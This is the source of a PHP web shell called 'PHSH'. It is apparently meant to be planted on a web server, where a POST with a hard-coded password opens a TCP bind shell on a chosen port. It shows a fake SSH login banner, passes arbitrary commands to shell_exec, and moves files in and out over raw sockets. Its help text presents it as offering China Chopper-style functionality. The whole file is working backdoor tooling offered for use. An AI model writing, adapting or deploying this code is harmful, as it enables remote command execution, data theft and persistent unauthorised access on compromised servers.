<h1>PHP Shell ver alpha</h1>
<hr>
Yet another php shell to deal with server logs.
<hr>
Usage: POST /?PORT={YOUR_PORT} <br>
data: password={YOUR_PASSWORD}

<?php

@ini_set("max_execution_time", 9999);
$debug = false;

// Start

if(!defined("STDIN")){
    if($_POST["password"] != "testpwd"){
        die("[*] Incorrect password.");
    }
    $port = intval($_GET["PORT"]);
    echo "[*] Running over".$port.".";
}else{
    echo("[*] Running under cli, passed password checking.");
    $port = 1232;
    $password = "123321";
}
debug_print("Starting server.");
$socket = stream_socket_server("tcp://0.0.0.0:".$port);
if(!$socket){
    die("[!] Failed starting server.");
}
do{
    $session = @stream_socket_accept($socket);
    if($session){
        debug_print("Starting session");
        debug_print("Password: ".$password);
        login($session, $password);
        debug_print("Logged in.");
        $server = new Server($session);
        debug_print("Session started.");
        $server->main();
        $exitflag=1;
    }
}while(!isset($exitflag));
fclose($socket);
echo("[*] Client stopped.");


// Functions


// Functions for system command. Just for exprenice.
class Server{
    function __construct($socket)
    {
        $this -> socket = $socket;
        $this -> cwd = getcwd();
        $this -> address = $_SERVER["REMOTE_ADDR"];
    }

    function ls($path){
        echo "PATH: $path\n";
        $path = getpath($path, $this->cwd);
        $dir = scandir($path);
        if(!$dir){
            output($this->socket, "ls: cannot access ".$path.": No such file or directory or permission denied.\n");
            return 1;
        }
        $buf = "";
        foreach($dir as $filename){
            $accesstime = @fileatime($path."/".$filename);
            $fsize = @filesize($path."/".$filename);
            $buf .= $filename." ".date("Y F d H:i:s")." ".$accesstime.' '.$fsize."byte(s)";
            $buf .= "\n";
        }
        output($this->socket, $buf);
    }

    function cat($file){
        if(!is_file($file)) output($this->socket, "cat: No such file or directory or permission denied.\n");
        output($this->socket, read(fopen($file, "r")));
    }

    function whoami(){
        output($this->socket, get_current_user()."\n"); 
    }
    
    function upload($filename){
        if($filename[0] != '/'){
            $filename = $this->cwd.'/'.$filename;
        }
        $port = rand(30000, 65535);
        output($this->socket, "upload: Please send file to port ".$port.". Please connect to target port anyway, this may cause a f**king bug.\n");
        $server = stream_socket_server("tcp://0.0.0.0:".$port);
        for(;;){
            @$session = stream_socket_accept($server); 
            if($session) break;
        }
        $fp = fopen($filename, "wb+");
        while($session){
            stream_copy_to_stream($session, $fp);
        }
        if(!is_file($filename)){
            output($this->socket, 'upload: No such fil e or permission denied.');
            return 0;
        }
        output($this->socket, "uploaded file ".$filename.".\n");
        @fclose($fp);
        @fclose($session);
}

    function download($filename){ 
        if($filename[0] != '/'){
            $filename = $this->cwd.'/'.$filename;
            echo($filename);
        }
        if(!is_file($filename)){
            output($this->socket, 'download: No such file or permission denied.');
            return 0;
        }
        $port = rand(30000, 65535);
        output($this->socket, "download: Please recv file at port ".$port.". Please connect to target port anyway, this may cause a bug.\n");
        $server = stream_socket_server("tcp://0.0.0.0:".$port);
        for(;;){
            @$session = stream_socket_accept($server);
            if($session) break;
        }
        $fp = fopen($filename, "rb");
        $buf = fread($fp, filesize($filename));
        output($session, $buf);
        output($this->socket, "downloaded file ".$filename.".\n");
        echo("[*]Download file success.");
        @fclose($fp);
        @fclose($session);
    }

    function help(){
        output($this->socket, "PHSH: the PHp interactive SHell\n
        PHSH is a interactive PHP shell with mostly full chopper functionailties.\n
        Commands:\n
            cd: change current dir to specified directories.\n
            ls: list dir.\n
            cat: read specified file.\n
            help: show this help.\n
            whoami: show current user.\n
        Special commands:\n
            upload: upload specified file.\n
            download: download specified file.\n
            Other functions will update due each release.\n
        Other:\n
            You can just execute shell functions as in other shells.\n
        NOTICE:\n
            This is a DUMB TERMINAL. Please don't use vim or applications which need a TTY. \n
        ");
    }
    
    function cd($path){
        $owd = $this->cwd;
        @chdir($path);
        $this->cwd = getcwd();
        if(getcwd() == $owd) output($this->socket,"cd: No such file or directory or permssion denied.\n");
    }

    function main(){
        debug_print("Starting main.");
        output($this->socket, "Warning: Author of this software got ABSOLUTELY NO WARRNITY.\n");
        output($this->socket, "PHPSH alpha: please use `exit` command to logout shell to end this session.\n");
        debug_print("Main start.\n");
        do{
            output($this->socket,get_current_user()."@phsh~".$this->cwd."# ");
            sleep(0.1); 
            $command = trim(fread($this->socket, 4096));
            $parsedcmd = explode(" ", $command);
            debug_print("CMD: ".$command);
            $i=0;
            foreach($parsedcmd as $item){
                $parsedcmd[$i]=trim($item);
                $i+=1;
            }
            switch($parsedcmd[0]){
                case "cd":
                if(count($parsedcmd)<=1){
                    output($this->socket,"cd: invalid parameters count.\n");
                    break; 
                }
                $this->cd($parsedcmd[1]);
                break;
                case "ls":
                if(count($parsedcmd)<= 1){
                    $this->ls(".");
                }else{
                    $this->ls($parsedcmd[1]);
                }
                break;
                case "cat":
                if(count($parsedcmd)<=1){
                    output($this->socket,"cat: invalid parameters count.\n");
                    break;
                }else{
                    $this->cat($parsedcmd[1]);
                }
                case "whoami":
                $this->whoami();
                break;
                case "upload":
                if(count($parsedcmd)<=1){
                    output($this->socket, "upload: invalid parameter count, missing filename.\n");
                }
                @$this->upload($parsedcmd[1]);
                break;
                case "download":
                if(count($parsedcmd)<=1){
                    output($this->socket, "download: invalid parameter count, missing filename\n");
                }
                @$this->download(getpath($this->cwd, $parsedcmd[1]));
                break;
                case "exit";
                output($this->socket,"logout.\n");
                $stopflag = 1;
                break;
                default:
                echo("EXEC CMD: $command");
                output($this->socket, shell_exec($command));
                break;
            }
        }while(!isset($stopflag));
    }
}
// System functions. Powered by MAGIC.

function output($socket, $message){
    if(!@fputs($socket, $message)){
        echo("[!] Failed to write to socket.");
    }else{
        echo("[*] Output: ".$message.".");
    }
    return 0;
}

function getpath($cwd, $path){
    if(substr($path, 0,1) !== "/"){
        $path = $cwd."/".$path;
    }
    return $path;
}

function read($fp){
    $buf = "";
    /*
    while(($line=fgets(fp))!==false){
        $buf.=$line;
    }
    */
    return fread($fp, 1024);
}

function recv($socket, $len=0){
    if(!$len){
        return read($socket);
    }
        return fgets($socket, intval($len));;
}

function login($socket, $password){
    output($socket, "CLoSEDSSH ver 2.3.3\n");
    output($socket, "\"This is NOT a encrypted connection, use as your own risk.\"\n");
    output($socket, get_current_user()."@phsh's password: ");
    if(trim(fread($socket, 1024)) != $password){
        output($socket, "Permission denied (password)\n");
        die("[!] Invalid user password.");
    }
}

// EXTRAFUNCTIONS for debugging.

function debug_print($string){
    global $debug;
    if($debug){
        echo($string);
    }
}
?>
